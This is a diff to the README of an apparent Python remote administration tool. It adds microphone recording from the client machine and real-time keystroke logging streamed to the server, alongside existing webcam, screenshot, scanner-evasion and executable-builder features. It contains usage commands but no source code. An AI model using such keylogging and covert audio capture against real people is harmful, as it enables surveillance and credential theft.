@@ -81,6 +81,8 @@ A **powerful** and **lightweight** Python-based remote administration tool that 
 | 🎯 | **OS-Specific Commands** - Advanced smart buttons that adapt to Windows/Linux/Mac | ✅ |
 | 🛡️ | **Anti-Scanner Protection** - Real-time socket probing and ghost connection rejection | ✅ |
 | ⌨️ | **Zero-Delay Terminal** - Fully interactive terminal with zero output latency | ✅ |
+| 🎤 | **Microphone Capture** - Record audio from client with automatic MP3 conversion | ✅ |
+| ⌨️ | **Live Keylog Streaming** - Real-time keystroke capture with toggle start/stop | ✅ |
 
 </div>
 
@@ -95,6 +97,9 @@ A **powerful** and **lightweight** Python-based remote administration tool that 
 *   **Advanced Anti-Scanner Protection:** Ghost TCP connections, port scanners, and older client executables are instantly purged.
 *   **Smarter Quick Commands:** Action buttons are dynamically generated based on the client's OS (Windows vs Linux vs Mac) and focus on advanced forensics (Firewalls, Scheduled Tasks, Memory Hogs).
 *   **Clean Process Kills:** Clicking "Disconnect" instantly and safely unloads the `.exe` from the client's RAM using hard `os._exit(0)`.
+*   **🎤 Microphone Capture:** Record audio from the client's microphone with duration selection. Automatically converts to MP3 via pydub on save.
+*   **⌨️ Live Keylog Streaming:** Keystrokes now stream in real-time to the server terminal with a toggle start/stop button. No more waiting for a timer — click "Stop Keylog" whenever you're done.
+*   **Bug Fixes:** Increased `max_chunks` for microphone (200→2000 prevents truncation), dynamic timeout based on recording duration, `sd.wait()` hang protection via daemon thread, removed duplicate POPUP handler, replaced `os._exit(0)` with hybrid `Timer(3s) + sys.exit(0)` for clean shutdown.
 
 ---
 
@@ -320,6 +325,34 @@ SCREENSHOT
 - 🔍 View at 100% original size
 - 📊 Memory-safe for large captures
 
+### 🎤 Microphone Capture
+
+```bash
+# In terminal or click 🎤 button
+MICROPHONE:10    # Record for 10 seconds (1-60)
+```
+
+**Features:**
+- 🎚️ Configurable duration (1-60 seconds)
+- 📦 Automatic MP3 conversion via pydub on save
+- 🔊 High-quality 44100Hz stereo WAV recording
+- 💾 Fallback raw WAV save if pydub is unavailable
+
+### ⌨️ Live Keylog Streaming
+
+```bash
+# In terminal or click ⌨️ button
+KEYLOG_START     # Start live keystream
+KEYLOG_STOP      # Stop keystream
+```
+
+**Features:**
+- ⚡ Real-time keystroke display in server terminal (GUI: green `keylog` tag)
+- 🔘 Toggle button — click once to start, again to stop
+- ⌨️ CLI: press `Ctrl+C` to end the stream
+- 💾 Auto-saved to `keylogs/` folder with timestamp + key count
+- 🧵 Background listener — GUI stays fully responsive during capture
+
 ### 📁 File Transfer
 
 **Download from client:**
@@ -484,10 +517,10 @@ This tool is perfect for understanding:
 📦 Remote-admin-tool
  ┣ 📜 server.py            # CLI server with advanced logging
  ┣ 📜 server_gui.py        # Professional GUI server (Main Entry)
- ┣ 📜 gui_globals.py       # Global states & thread-safe logging
+ ┣ 📜 gui_globals.py       # Global states, keylog streaming state & thread-safe logging
  ┣ 📜 gui_network.py       # Multi-client TCP listener & socket manager
- ┣ 📜 gui_commands.py      # Real-time command execution (Zero-Delay)
- ┣ 📜 gui_features.py      # Webcam, screenshot, & native popup logic
+ ┣ 📜 gui_commands.py      # Real-time command execution (Zero-Delay) + keylog stream handler
+ ┣ 📜 gui_features.py      # Screenshot, webcam, microphone, keylog toggle, & popup logic
  ┣ 📜 client.py            # Smart client with auto-reconnect
  ┣ 📜 advanced_build.py    # Auto-tunneling & .exe/binary compiler
  ┣ 📜 requirements.txt     # Python dependencies (incl. PyInstaller)
